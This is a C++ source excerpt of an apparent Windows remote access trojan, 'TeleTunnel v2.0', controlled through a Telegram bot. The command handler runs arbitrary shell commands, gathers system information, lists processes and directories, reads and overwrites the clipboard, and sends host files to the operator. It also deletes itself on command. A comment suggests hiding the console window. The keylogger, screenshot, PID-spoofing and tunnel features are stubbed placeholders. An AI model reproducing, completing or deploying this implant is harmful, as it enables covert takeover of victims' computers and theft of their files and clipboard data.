// --- Command handling ---
void ProcessCommand(const std::string& command, const std::string& chat_id) {
    std::string output;
    if (command == "sysinfo") {
        output = "System Information:\n";
        output += "Hostname: " + exec("hostname") + "\n";
        output += "User: " + exec("whoami") + "\n";
        output += "OS: " + exec("ver") + "\n";
    } else if (command == "ps") {
        output = exec("tasklist");
    } else if (command == "ss") {
        // Screenshot capture using GDI+ (simplified)
        // In a full implementation, this would capture the screen and save as JPEG.
        output = "[Screenshot captured]";
        SendPhoto(chat_id, "screenshot.jpg");
    } else if (command.rfind("ls ", 0) == 0) {
        std::string path = command.substr(3);
        output = exec(("dir \"" + path + "\" 2>&1").c_str());
    } else if (command.rfind("> ", 0) == 0) {
        std::string cmd = command.substr(2);
        output = exec(cmd.c_str());
    } else if (command.rfind("spawn ", 0) == 0) {
        // Spawn command with parent PID spoofing (placeholder)
        output = "[Spawn not implemented in this version]";
    } else if (command == "clip get") {
        if (OpenClipboard(nullptr)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pszText = static_cast<char*>(GlobalLock(hData));
                if (pszText) {
                    output = "Clipboard: " + std::string(pszText);
                    GlobalUnlock(hData);
                } else output = "Failed to lock clipboard data";
            } else output = "No text in clipboard";
            CloseClipboard();
        } else output = "Failed to open clipboard";
    } else if (command.rfind("clip set ", 0) == 0) {
        std::string text = command.substr(9);
        if (OpenClipboard(nullptr)) {
            EmptyClipboard();
            HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
            if (hGlob) {
                memcpy(GlobalLock(hGlob), text.c_str(), text.size() + 1);
                GlobalUnlock(hGlob);
                SetClipboardData(CF_TEXT, hGlob);
                output = "Clipboard set successfully";
            } else output = "GlobalAlloc failed";
            CloseClipboard();
        } else output = "Failed to open clipboard";
    } else if (command.rfind("get ", 0) == 0) {
        std::string file = command.substr(4);
        // Send file via Telegram (simplified)
        SendPhoto(chat_id, file);
        output = "File sent: " + file;
    } else if (command == "keylog start") {
        // Start keylogger (set hook) – placeholder
        output = "Keylogger started (simulated)";
    } else if (command == "keylog stop") {
        output = "Keylogger stopped";
    } else if (command == "keylog dump") {
        output = "[Keylog dump not implemented]";
    } else if (command.rfind("open ", 0) == 0) {
        output = "[Tunnel open not implemented]";
    } else if (command == "kill") {
        // Self-delete and exit
        output = "Terminating...";
        SendMessage(chat_id, output);
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        std::string cmd = "del \"" + std::string(path) + "\"";
        system(cmd.c_str());
        ExitProcess(0);
    } else {
        output = "Unknown command. Type /start for help.";
    }

    if (!output.empty()) {
        SendMessage(chat_id, output);
    }
}

// Main loop
int main() {
    // Hide console window if compiled with -mwindows
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (!InitWininet()) {
        MessageBoxA(NULL, "Failed to initialize WinINet", "Error", MB_OK);
        return 1;
    }

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    int64_t last_update_id = 0;

    while (true) {
        std::string response = GetUpdates(last_update_id + 1);
        if (response.empty()) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }

        try {
            auto j = json::parse(response);
            if (j.contains("result") && j["result"].is_array()) {
                for (auto& update : j["result"]) {
                    int64_t update_id = update["update_id"];
                    if (update_id > last_update_id) last_update_id = update_id;

                    if (update.contains("message")) {
                        auto& msg = update["message"];
                        std::string chat_id = std::to_string(msg["chat"]["id"].get<int64_t>());
                        if (chat_id != OWNER_ID) {
                            // Not authorized – ignore
                            continue;
                        }
                        if (msg.contains("text")) {
                            std::string text = msg["text"];
                            // Remove leading slash if present
                            if (!text.empty() && text[0] == '/') text = text.substr(1);
                            if (text == "start") {
                                SendMessage(chat_id, "TeleTunnel v2.0 ready.\nType commands from the menu.");
                            } else {
                                ProcessCommand(text, chat_id);
                            }
                        } else if (msg.contains("document")) {
                            // Handle file upload (simplified)
                            SendMessage(chat_id, "File received (upload to host not implemented in this snippet).");
                        }
                    }
                }
            }
        } catch (const std::exception& e) {
            // JSON parsing error, ignore
        }

        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
    InternetCloseHandle(hInternet);
    return 0;
}




